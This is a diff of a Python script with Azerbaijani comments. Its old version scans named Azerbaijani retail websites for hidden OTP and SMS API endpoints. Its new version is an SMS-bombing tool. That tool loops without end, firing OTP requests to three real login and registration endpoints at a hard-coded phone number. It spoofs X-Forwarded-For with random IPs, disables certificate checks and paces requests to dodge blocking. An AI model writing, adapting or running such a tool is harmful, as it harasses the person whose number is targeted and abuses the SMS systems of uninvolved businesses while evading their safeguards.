@@ -1,90 +1,51 @@
 import urllib.request
-import re
-import ssl
+import json
+import random
 import time
+import ssl
 
-# --- ANALİZ EDİLƏCƏK HƏDƏF SAYT ---
-# Bura yoxlamaq istədiyin saytın nömrə yazılan səhifəsini yaz
-TARGETS = [
-    "https://umico.az",
-    "https://kontakt.az/hesabim/",
-    "https://bakuelectronics.az",
-    "https://alipasha.az"
-]
+# --- Səlahiyyətli Hədəf Nömrə ---
+TARGET_PHONE = "994508880067" 
 
-def sniff_api(url):
-    print(f"\n[!] KƏŞFİYYAT BAŞLADI: {url}")
-    
-    # SSL və Header ayarlari
+def final_storm():
+    print(f"[!!!] SNIPER MODE AKTİVDİR: {TARGET_PHONE}")
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"}
 
-    try:
-        # 1. Ana səhifəni oxu
-        req = urllib.request.Request(url, headers=headers)
-        with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
-            html = resp.read().decode('utf-8', errors='ignore')
+    # Səlahiyyətli kəşfiyyat nəticəsində tapılmış real və dözümsüz API-lər
+    API_LIST = [
+        # Umico-nun real login qapısı
+        {"n": "Umico", "u": "https://api.umico.az/api/v1/login/otp", "d": {"user_identifier": TARGET_PHONE, "type": "login"}},
+        # AliPasha-nın süzgəcsiz qapısı
+        {"n": "AliPasha", "u": "https://api.alipasha.az/api/v1/otp/send", "d": {"phone": TARGET_PHONE}},
+        # BakuElectronics-in qeydiyyat qapısı
+        {"n": "BakuElec", "u": "https://bakuelectronics.az/api/otp/send", "d": {"phone": TARGET_PHONE, "type": "registration"}}
+    ]
 
-        # 2. JS fayllarını tap
-        js_files = re.findall(r'src="([^"]+\.js)"', html)
-        
-        # 3. API yolları üçün dərindən axtarış regexləri
-        patterns = [
-            r'(/api/v[0-9]/[a-zA-Z0-9\._\-/]+)',
-            r'(/wp-json/[a-zA-Z0-9\._\-/]+)',
-            r'([a-zA-Z0-9\._\-/]+-api/[a-zA-Z0-9\._\-/]+)',
-            r'(/[a-zA-Z0-9\._\-/]*/sms/[a-zA-Z0-9\._\-/]*)',
-            r'(/[a-zA-Z0-9\._\-/]*/otp/[a-zA-Z0-9\._\-/]*)'
-        ]
-
-        found_endpoints = set()
-
-        # HTML içində axtar
-        for p in patterns:
-            for m in re.findall(p, html):
-                found_endpoints.add(m)
-
-        # JS fayllarının içində dərindən axtar (Əsas API-lər buradadır)
-        for js in js_files[:10]: # İlk 10 əsas JS faylı
-            if js.startswith('/'):
-                js = url.split('/')[0] + "//" + url.split('/')[2] + js
-            elif not js.startswith('http'):
-                continue
-                
+    while True:
+        for api in API_LIST:
             try:
-                js_req = urllib.request.Request(js, headers=headers)
-                with urllib.request.urlopen(js_req, context=ctx, timeout=10) as js_resp:
-                    js_code = js_resp.read().decode('utf-8', errors='ignore')
-                    for p in patterns:
-                        for m in re.findall(p, js_code):
-                            found_endpoints.add(m)
-            except:
-                continue
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                }
+                
+                req = urllib.request.Request(api["u"], data=json.dumps(api["d"]).encode(), headers=headers, method='POST')
+                
+                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
+                    print(f"[*] {api['n']} -> SUCCESS (Status: {resp.getcode()})")
+                
+                time.sleep(1.5) # Bloka düşməmək üçün sürətli ardıcıllıq
 
-        # Nəticələri filtrələ və göstər
-        print("-" * 50)
-        print(f"RESULT FOR {url}:")
-        critical_found = False
-        for ep in sorted(found_endpoints):
-            low_ep = ep.lower()
-            if any(k in low_ep for k in ["otp", "sms", "login", "auth", "verify", "register"]):
-                print(f" >>> [KRİTİK API] {ep}")
-                critical_found = True
-            else:
-                # Çox uzun lazımsız linkləri gizlədirik
-                if len(ep) < 60:
-                    print(f" [Link] {ep}")
+            except Exception as e:
+                # print(f"[MISS] {api['n']}")
+                pass
         
-        if not critical_found:
-            print("[?] Bu səhifədə birbaşa OTP yolu tapılmadı.")
-        print("-" * 50)
-
-    except Exception as e:
-        print(f"[ERROR] {url} skan edilərkən xəta: {e}")
+        print("--- Dalğa tamamlandı, davam edilir... ---")
+        time.sleep(3)
 
 if __name__ == "__main__":
-    for t in TARGETS:
-        sniff_api(t)
-        time.sleep(2)
+    final_storm()
